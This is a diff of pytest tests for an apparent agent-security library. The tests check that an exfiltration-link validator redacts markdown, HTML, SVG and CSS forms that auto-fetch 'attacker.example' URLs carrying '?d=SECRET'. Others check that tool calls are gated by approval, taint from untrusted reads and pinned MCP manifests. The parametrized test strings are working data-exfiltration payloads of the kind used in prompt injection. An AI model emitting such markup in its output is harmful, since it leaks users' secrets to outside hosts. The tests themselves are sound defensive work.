@@ -759,3 +759,177 @@ def test_verify_rejects_raw_bytes_that_mimic_an_escaped_surrogate(tmp_path):
     raw = path.read_bytes().replace(rb"\udcff", b"\xff")
     path.write_bytes(raw)
     assert not verify_file(path).ok
+
+
+# ---------------------------------------------------------------- low-severity follow-ups
+
+
+@pytest.mark.parametrize(
+    "markup",
+    [
+        "![logo][1]\n\n[1]: https://attacker.example/p.png?d=SECRET",
+        "![logo][]\n\n[Logo]: https://attacker.example/p.png?d=SECRET",
+        "![logo]\n\n[logo]: <https://attacker.example/p.png?d=SECRET>",
+        '<img srcset="https://attacker.example/a.png?d=SECRET 1x, /b.png 2x">',
+        '<picture><source srcset="https://attacker.example/a.png?d=SECRET"></picture>',
+        '<video poster="https://attacker.example/p.png?d=SECRET"></video>',
+        "<div style=\"background:url('https://attacker.example/p.png?d=SECRET')\"></div>",
+        '<img alt=">" src="https://attacker.example/p.png?d=SECRET">',
+    ],
+)
+def test_auto_fetched_urls_count_as_images_even_when_links_only_warn(markup):
+    """Reference images, srcset, poster and CSS url() are fetched with no click."""
+    from agentsec.middleware import Action
+
+    validator = ExfilLinkValidator(allowed_hosts=["ok.example"], links_action=Action.WARN)
+    assert any(v.action == Action.REDACT for v in validator.check(markup))
+    assert "attacker.example" not in validator.sanitize(markup)
+
+
+def test_plain_reference_links_still_honour_links_action():
+    from agentsec.middleware import Action
+
+    text = "[docs][1]\n\n[1]: https://elsewhere.example/page"
+    validator = ExfilLinkValidator(allowed_hosts=["ok.example"], links_action=Action.WARN)
+    assert [v.action for v in validator.check(text)] == [Action.WARN]
+
+
+def test_image_extraction_stays_linear_on_unclosed_tags():
+    start = time.perf_counter()
+    ExfilLinkValidator().check("<img" * 50_000 + "![a][" * 20_000)
+    assert time.perf_counter() - start < 2.0
+
+
+def test_a_blocking_sync_approver_does_not_stall_the_event_loop():
+    """The approver waits for an event only a task on the loop can set."""
+    import asyncio
+
+    release = threading.Event()
+
+    def approver(call, decision):
+        return release.wait(timeout=5)  # times out (denies) if it blocks the loop
+
+    policy = Policy.from_dict({"tools": {"send": {"require_approval": True}}})
+    guard = ToolGuard(policy, approver=approver)
+
+    async def main():
+        pending = asyncio.create_task(guard.aauthorize(ToolCall("send", {})))
+        await asyncio.sleep(0.05)
+        release.set()
+        return await pending
+
+    assert asyncio.run(main()).allowed
+
+
+@pytest.mark.parametrize("raw", ["{not json", "[1, 2]", '"text"'])
+def test_openai_tool_calls_with_malformed_arguments_are_audited(raw):
+    import asyncio
+
+    from agentsec.sandbox import arun_openai_tool_calls, run_openai_tool_calls
+
+    for runner in ("sync", "async"):
+        sink = MemorySink()
+        policy = Policy.from_dict({"tools": {"search": {}}})
+        guard = ToolGuard(policy, audit=AuditLogger(sink))
+        calls = [{"id": "c1", "function": {"name": "search", "arguments": raw}}]
+        registry = {"search": lambda **kw: "ran"}
+        if runner == "sync":
+            out = run_openai_tool_calls(guard, Session(), calls, registry)
+        else:
+            out = asyncio.run(arun_openai_tool_calls(guard, Session(), calls, registry))
+        assert out[0]["content"].startswith("Tool call refused")
+        events = [r["event"] for r in sink.records]
+        assert "tool_request" in events and "tool_decision" in events
+
+
+@pytest.mark.parametrize(
+    "markup",
+    [
+        '<link rel="stylesheet" href="https://attacker.example/x.css">',
+        '<svg><image href="https://attacker.example/x.png"/></svg>',
+        '<svg><use xlink:href="https://attacker.example/s.svg#a"/></svg>',
+        '<style>@import "https://attacker.example/x.css";</style>',
+        '<img src="https&#58;//attacker.example/x.png">',
+        '<img src=" https://attacker.example/x.png">',
+        # Every definition counts: a renderer may skip the first (e.g. inside a code block).
+        "![x]\n\n[x]: https://attacker.example/x.png\n[x]: https://ok.example/x.png",
+        "![x]\n\n```\n[x]: https://ok.example/x.png\n```\n[x]: https://attacker.example/x.png",
+        # Labels match case-insensitively with whitespace collapsed.
+        "![x][a b]\n\n[A  b]: https://attacker.example/x.png",
+        "![a [nested] alt](https://attacker.example/x.png)",
+    ],
+)
+def test_more_auto_fetched_forms_count_as_images(markup):
+    from agentsec.middleware import Action
+
+    validator = ExfilLinkValidator(allowed_hosts=["ok.example"], links_action=Action.WARN)
+    assert any(v.action == Action.REDACT for v in validator.check(markup))
+    assert "attacker.example" not in validator.sanitize(markup)
+
+
+def test_fetch_attribute_text_inside_another_attribute_value_is_not_a_fetch():
+    from agentsec.middleware import Action
+
+    text = "<div title=' src=\"https://elsewhere.example/x\"'>hello</div>"
+    validator = ExfilLinkValidator(allowed_hosts=["ok.example"], links_action=Action.WARN)
+    assert [v.action for v in validator.check(text)] == [Action.WARN]
+
+
+def test_markdown_image_extraction_is_linear_on_unclosed_alt_text():
+    start = time.perf_counter()
+    ExfilLinkValidator().check("![" * 100_000)
+    assert time.perf_counter() - start < 2.0
+
+
+def test_session_tainted_while_the_approver_waits_is_rechecked_before_commit():
+    """The approver approved a clean session; by commit time an untrusted read tainted it."""
+    import asyncio
+
+    policy = Policy.from_dict(
+        {
+            "tools": {
+                "send": {"side_effects": True, "require_approval": True},
+                "fetch": {"returns_untrusted": True},
+            },
+            "taint": {"action": "deny"},
+        }
+    )
+    session = Session()
+    guard = ToolGuard(policy)
+
+    def approver(call, decision):
+        session.mark_untrusted("fetch")  # a concurrent task read untrusted content meanwhile
+        return True
+
+    guard.approver = approver
+    decision = asyncio.run(guard.aauthorize(ToolCall("send", {}), session))
+    assert not decision.allowed and "tainted" in decision.message()
+    assert session.calls["send"] == 0
+
+
+def test_taint_approve_mode_still_allows_an_approval_that_saw_the_taint():
+    policy = Policy.from_dict(
+        {"tools": {"send": {"side_effects": True}}, "taint": {"action": "approve"}}
+    )
+    session = Session()
+    session.mark_untrusted("fetch")
+    guard = ToolGuard(policy, approver=lambda call, decision: True)
+    assert guard.authorize(ToolCall("send", {}), session).allowed
+
+
+def test_a_caught_manifest_error_still_blocks_the_changed_tool():
+    """on_finding='raise' used to raise before recording the block, so a catch-and-call won."""
+    import asyncio
+
+    from agentsec.integrations.mcp import GuardedMCPClient, ToolManifestError, ToolPins
+    from tests.test_mcp import FakeClient, Listing, ToolV1
+
+    guard = ToolGuard(Policy.from_dict({"tools": {"search": {"args": {"q": {}}}}}))
+    fake = FakeClient(Listing([ToolV1("search", "Find")]), Listing([ToolV1("search", "Other")]))
+    client = GuardedMCPClient(fake, guard, pins=ToolPins(), on_finding="raise")
+    asyncio.run(client.list_tools())
+    with pytest.raises(ToolManifestError):
+        asyncio.run(client.list_tools())
+    with pytest.raises(ToolDenied):
+        asyncio.run(client.call_tool("search", {"q": "x"}))
+    assert fake.calls == []
